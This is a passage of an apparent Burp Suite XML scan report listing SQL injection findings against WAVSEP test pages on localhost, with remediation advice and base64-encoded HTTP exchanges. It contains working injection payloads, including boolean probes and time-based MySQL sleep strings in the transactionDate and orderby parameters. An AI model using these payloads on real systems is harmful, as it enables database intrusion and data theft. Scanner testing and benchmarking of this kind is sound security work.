      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTAtSW5qZWN0aW9uSW5TZWFyY2hPcmRlckJ5LU51bWVyaWMtQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogOQ0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwVmFsaWQvQ2FzZTEwLUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1OdW1lcmljLUJpbmFyeURlbGliZXJhdGVSdW50aW1lRXJyb3ItV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm9yZGVyYnk9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEp]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQxOjQ1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3NzMNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEwIC0gSW5qZWN0aW9uIGludG8gYW4gb3JkZXIgYnkgY2xhdXNlIChudW1lcmljKSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEKPC9URD4KPFREPgpXZWxjb21lIHRvIHRoZSB3ZWIgc2l0ZQo8L1REPgo8VEQ+CnRlc3RpbnB1dAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMgo8L1REPgo8VEQ+ClJlbWVtYmVyIHRvIGNoYW5nZSB5b3VyIHBhc3N3b3JkCjwvVEQ+CjxURD4KSW52ZXN0IGluIHlvdXIgc2VjdXJpdHkhCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgozCjwvVEQ+CjxURD4KWW91ciBhY2NvdW50IGlzIGFib3V0IHRvIGV4cGlyZQo8L1REPgo8VEQ+ClBsZWFzZSByZW5ldyBpdCBpbiB0aGUgbmV4dCB0d28gd2Vla3MKPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2791348589932569600</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case11-InjectionInView-Date-PermissionBypass-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case11-InjectionInView-Date-PermissionBypass-WithDifferent200Responses.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>' and '3411'='3411</b> and <b>' and '8226'='8233</b> were each submitted in the transactionDate parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application took <b>20012</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTEtSW5qZWN0aW9uSW5WaWV3LURhdGUtUGVybWlzc2lvbkJ5cGFzcy1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMjYNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMFZhbGlkL0Nhc2UxMS1JbmplY3Rpb25JblZpZXctRGF0ZS1QZXJtaXNzaW9uQnlwYXNzLVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbkRhdGU9MjAxMC0wMS0wMSclMjBhbmQlMjAnMzQxMSclM2QnMzQxMQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQyOjQ2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2MTUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTEgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzMgo8L1REPgo8VEQ+CjEwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTEtSW5qZWN0aW9uSW5WaWV3LURhdGUtUGVybWlzc2lvbkJ5cGFzcy1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMjYNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMFZhbGlkL0Nhc2UxMS1JbmplY3Rpb25JblZpZXctRGF0ZS1QZXJtaXNzaW9uQnlwYXNzLVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbkRhdGU9MjAxMC0wMS0wMSclMjBhbmQlMjAnODIyNiclM2QnODIzMw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQyOjQ2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MjENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTEgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTEtSW5qZWN0aW9uSW5WaWV3LURhdGUtUGVybWlzc2lvbkJ5cGFzcy1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMjYNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMFZhbGlkL0Nhc2UxMS1JbmplY3Rpb25JblZpZXctRGF0ZS1QZXJtaXNzaW9uQnlwYXNzLVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbkRhdGU9MjAxMC0wMS0wMSclMmIoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSklMmIn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQxOjQ1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MjENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTEgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3641138725247555584</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case12-InjectionInSearch-Date-UnionExploit-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case12-InjectionInSearch-Date-UnionExploit-WithDifferent200Responses.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>' and '8591'='8591</b> and <b>' and '2177'='2186</b> were each submitted in the transactionDate parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application took <b>20009</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyMGFuZCUyMCc4NTkxJyUzZCc4NTkx]]></request>
